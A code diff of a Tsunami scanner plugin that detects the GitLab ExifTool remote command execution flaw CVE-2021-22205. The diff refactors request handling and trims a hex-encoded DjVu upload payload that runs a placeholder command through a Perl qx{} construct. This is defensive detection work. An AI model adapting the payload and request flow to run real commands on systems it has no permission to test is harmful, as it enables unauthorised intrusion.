@@ -15,18 +15,11 @@
  */
 package com.google.tsunami.plugins.detectors.cves.cve202122205;
 
-import static com.google.common.base.Preconditions.checkNotNull;
-import static com.google.common.collect.ImmutableList.toImmutableList;
-import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
-import static com.google.common.net.HttpHeaders.COOKIE;
-import static com.google.common.net.HttpHeaders.USER_AGENT;
-import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
-import static com.google.tsunami.common.net.http.HttpRequest.get;
-import static com.google.tsunami.common.net.http.HttpRequest.post;
-
+import com.google.api.client.util.Strings;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.common.io.BaseEncoding;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
@@ -37,36 +30,30 @@ import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
-import com.google.tsunami.proto.DetectionReport;
-import com.google.tsunami.proto.DetectionReportList;
-import com.google.tsunami.proto.DetectionStatus;
-import com.google.tsunami.proto.NetworkService;
-import com.google.tsunami.proto.Severity;
-import com.google.tsunami.proto.TargetInfo;
-import com.google.tsunami.proto.Vulnerability;
-import com.google.tsunami.proto.VulnerabilityId;
+import com.google.tsunami.proto.*;
+
+import javax.inject.Inject;
 import java.io.IOException;
 import java.time.Clock;
 import java.time.Instant;
-import java.util.HashMap;
 import java.util.Iterator;
-import java.util.Map;
-import java.util.Objects;
+import java.util.Locale;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-import javax.inject.Inject;
-import org.apache.commons.codec.DecoderException;
-import org.apache.commons.codec.binary.Hex;
+
+import static com.google.common.base.Preconditions.checkNotNull;
+import static com.google.common.collect.ImmutableList.toImmutableList;
+import static com.google.common.net.HttpHeaders.*;
+import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
+import static com.google.tsunami.common.net.http.HttpRequest.get;
+import static com.google.tsunami.common.net.http.HttpRequest.post;
 
 /** A {@link VulnDetector} that detects the CVE-2021-22205 vulnerability. */
 @PluginInfo(
     type = PluginType.VULN_DETECTION,
     name = "CVE202122205VulnDetector",
     version = "0.1",
-    description =
-        "An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. "
-            + "GitLab was not properly validating image files that were passed to a file parser "
-            + "which resulted in a remote command execution.",
+    description = Cve202122205VulnDetector.VULN_DESCRIPTION,
     author = "hh-hunter",
     bootstrapModule = Cve202122205DetectorBootstrapModule.class)
 public final class Cve202122205VulnDetector implements VulnDetector {
@@ -83,7 +70,6 @@ public final class Cve202122205VulnDetector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
   private static final String USER_SIGN_PATH = "users/sign_in";
   private static final String VUL_PATH = "uploads/user";
-  private static final String CSRF_TOKEN = "csrf_token";
   private static final Pattern CSRF_TOKEN_PATTERN =
       Pattern.compile("csrf-token\" content=\"(.*?)\" />\\n\\n<meta");
   /**
@@ -91,7 +77,8 @@ public final class Cve202122205VulnDetector implements VulnDetector {
    * article devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html
    * https://github.com/mr-r3bot/Gitlab-CVE-2021-22205 I generated a Poc locally, executed the
    * command TSUNAMI_SCANNER (placeholder), and then converted the PoC to hexadecimal. When sending
-   * data, I only need to convert the hexadecimal code to a string.
+   * data, I only need to convert the hexadecimal code to a string. Please note that this Payload
+   * has been streamlined and can only be used for PoC verification and cannot be exploited
    */
   private static final String POST_DATA =
       "0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358350D0A436F"
@@ -102,18 +89,9 @@ public final class Cve202122205VulnDetector implements VulnDetector {
           + "5655494E464F0000000A00080008180064001600494E434C0000000F7368617265645F616E6E6F2E696666"
           + "004247343400000011004A0102000800088AE6E1B137D97F2A89004247343400000004010FF99F42473434"
           + "00000002020A464F524D00000307444A5649414E546100000150286D657461646174610A0928436F707972"
-          + "6967687420225C0A22202E2071787B5453554e414d495f5343414e4e45527D202E205C0A22206220222920"
-          + "29202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
-          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
-          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
-          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
-          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
-          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
-          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
-          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
-          + "20202020202020202020202020202020202020202020202020202020202020202020202020202020202020"
-          + "20202020202020202020202020202020202020202020202020202020202020202020200A0D0A2D2D2D2D2D"
-          + "2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358352D2D0D0A";
+          + "6967687420225C0A22202E2071787B5453554E414D495F5343414E4E45527D202E205C0A22206220222920"
+          + "290A0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358"
+          + "352D2D0D0A";
 
   private final HttpClient httpClient;
   private final Clock utcClock;
@@ -130,7 +108,7 @@ public final class Cve202122205VulnDetector implements VulnDetector {
         || NetworkServiceUtils.getServiceName(networkService).equals("unknown");
   }
 
-  private static String buildTargetUserSignUrl(NetworkService networkService) {
+  private static StringBuilder buildTarget(NetworkService networkService) {
     StringBuilder targetUrlBuilder = new StringBuilder();
     if (NetworkServiceUtils.isWebService(networkService)) {
       targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
@@ -140,22 +118,7 @@ public final class Cve202122205VulnDetector implements VulnDetector {
           .append(toUriAuthority(networkService.getNetworkEndpoint()))
           .append("/");
     }
-    targetUrlBuilder.append(USER_SIGN_PATH);
-    return targetUrlBuilder.toString();
-  }
-
-  private static String buildTargetVulnerabilityUrl(NetworkService networkService) {
-    StringBuilder targetUrlBuilder = new StringBuilder();
-    if (NetworkServiceUtils.isWebService(networkService)) {
-      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
-    } else {
-      targetUrlBuilder
-          .append("http://")
-          .append(toUriAuthority(networkService.getNetworkEndpoint()))
-          .append("/");
-    }
-    targetUrlBuilder.append(VUL_PATH);
-    return targetUrlBuilder.toString();
+    return targetUrlBuilder;
   }
 
   @Override
@@ -177,9 +140,9 @@ public final class Cve202122205VulnDetector implements VulnDetector {
     return cookie.split("path=/;")[0];
   }
 
-  private Map<String, String> getCsrfTokenAndCookie(NetworkService networkService) {
-    String targetUserSignUrl = buildTargetUserSignUrl(networkService);
-    HashMap<String, String> result = new HashMap<>();
+  private Cve202122205VulnVo getCsrfTokenAndCookie(NetworkService networkService) {
+    String targetUserSignUrl = buildTarget(networkService).append(USER_SIGN_PATH).toString();
+    Cve202122205VulnVo result = new Cve202122205VulnVo();
     try {
       HttpResponse httpResponse =
           httpClient.send(get(targetUserSignUrl).withEmptyHeaders().build(), networkService);
@@ -187,14 +150,14 @@ public final class Cve202122205VulnDetector implements VulnDetector {
         String cookie = httpResponse.headers().get(SET_COOKIE).get();
         Matcher csrfTokenMatcher = CSRF_TOKEN_PATTERN.matcher(httpResponse.bodyString().get());
         if (csrfTokenMatcher.find() && !cookie.isEmpty()) {
-          result.put(CSRF_TOKEN, csrfTokenMatcher.group(1));
+          result.setCsrfToken(csrfTokenMatcher.group(1));
           StringBuilder cookies = new StringBuilder();
           Iterator<String> headerCookies =
               httpResponse.headers().getAll(SET_COOKIE).stream().iterator();
           while (headerCookies.hasNext()) {
             cookies.append(clearCookie(headerCookies.next()));
           }
-          result.put(COOKIE, cookies.toString());
+          result.setCookie(cookies.toString());
         }
       }
     } catch (IOException e) {
@@ -205,14 +168,15 @@ public final class Cve202122205VulnDetector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
-    String targetVulnerabilityUrl = buildTargetVulnerabilityUrl(networkService);
-    Map<String, String> preInfo = getCsrfTokenAndCookie(networkService);
-    if (Objects.requireNonNull(preInfo).isEmpty()) {
-      logger.atWarning().log("Get %s csrf_token failed", networkService);
-      return false;
-    }
+    String targetVulnerabilityUrl = buildTarget(networkService).append(VUL_PATH).toString();
     try {
-      byte[] payload = Hex.decodeHex(POST_DATA);
+      Cve202122205VulnVo info = getCsrfTokenAndCookie(networkService);
+      assert info != null;
+      if (Strings.isNullOrEmpty(info.getCookie()) && Strings.isNullOrEmpty(info.getCsrfToken())) {
+        logger.atWarning().log("Get %s Csrf Token and Cookie failed", networkService);
+        return false;
+      }
+      byte[] payload = BaseEncoding.base16().decode(POST_DATA.toUpperCase(Locale.ROOT));
       HttpResponse httpResponse =
           httpClient.send(
               post(targetVulnerabilityUrl)
@@ -222,9 +186,9 @@ public final class Cve202122205VulnDetector implements VulnDetector {
                               CONTENT_TYPE,
                               "multipart/form-data; boundary=----WebKitFormBoundaryIMv3"
                                   + "mxRg59TkFSX5")
-                          .addHeader("X-CSRF-Token", preInfo.get(CSRF_TOKEN), false)
+                          .addHeader("X-CSRF-Token", info.getCsrfToken(), false)
                           .addHeader(USER_AGENT, "TSUNAMI_SCANNER")
-                          .addHeader(COOKIE, preInfo.get(COOKIE))
+                          .addHeader(COOKIE, info.getCookie())
                           .build())
                   .setRequestBody(ByteString.copyFrom(payload))
                   .build(),
@@ -233,11 +197,8 @@ public final class Cve202122205VulnDetector implements VulnDetector {
           && httpResponse.bodyString().get().contains(DETECTION_STRING)) {
         return true;
       }
-    } catch (IOException e) {
+    } catch (IOException | AssertionError e) {
       logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
-      return false;
-    } catch (DecoderException e) {
-      logger.atWarning().withCause(e).log("Decode Payload failed");
       return false;
     }
     return false;
